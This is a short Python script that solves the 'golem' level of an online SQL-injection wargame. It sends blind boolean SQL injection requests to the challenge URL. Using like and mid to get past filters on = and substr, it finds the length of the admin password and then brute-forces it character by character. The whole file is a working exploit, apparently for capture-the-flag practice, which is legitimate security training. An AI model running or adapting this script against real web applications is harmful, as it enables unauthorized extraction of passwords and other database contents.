import urllib3
import requests

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1'|| id like 'admin'%26%26"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

length = 0

for i in range(0,100):
    query = "length(pw) like {}%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    if "Hello admin" in req.text:
        length = i
        break

print(length)

ans=''
for i in range(1, length+1):
    for j in ch:
        query = "ascii(mid(pw,{},1)) like {}%23".format(i, ord(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "Hello admin" in req.text:
            print("[+] find password letter is {}".format(j))
            print("the letter is {}".format(i))
            ans += j
            break

print(ans)

#subtitle을 못쓰니까 mid를 대신 썻다.
# = 대신 모두 like로 바꿨다.
